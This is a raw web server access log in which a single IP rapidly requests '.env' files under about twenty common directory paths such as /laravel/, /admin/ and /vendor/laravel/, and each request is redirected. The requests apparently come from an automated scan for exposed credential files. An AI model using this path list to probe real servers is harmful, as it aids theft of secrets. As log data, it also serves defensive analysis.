139.99.120.203 - - [19/Jan/2023:02:02:13 -0600] "GET /old/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:14 -0600] "GET /local/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:15 -0600] "GET /api/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:16 -0600] "GET /blog/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:18 -0600] "GET /crm/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:19 -0600] "GET /admin/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:20 -0600] "GET /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:21 -0600] "GET /app/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:22 -0600] "GET /app/config/.env HTTP/1.1" 301 247 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:23 -0600] "GET /apps/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:24 -0600] "GET /audio/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:25 -0600] "GET /cgi-bin/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:26 -0600] "GET /backend/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:27 -0600] "GET /src/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:28 -0600] "GET /base/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:30 -0600] "GET /core/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:31 -0600] "GET /vendor/laravel/.env HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:32 -0600] "GET /storage/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:33 -0600] "GET /protected/.env HTTP/1.1" 301 246 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.99.120.203 - - [19/Jan/2023:02:02:34 -0600] "GET /newsite/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
